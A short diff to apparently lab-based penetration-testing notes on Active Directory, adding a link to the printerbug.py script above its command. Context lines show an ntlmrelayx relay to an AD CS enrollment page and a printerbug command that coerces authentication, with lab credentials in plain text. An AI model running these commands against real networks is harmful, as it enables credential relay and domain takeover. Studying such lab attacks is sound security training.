@@ -864,6 +864,7 @@ $ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2
 - Printer Bug Exploitation
 
 ```
+https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 $ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
 ```
 
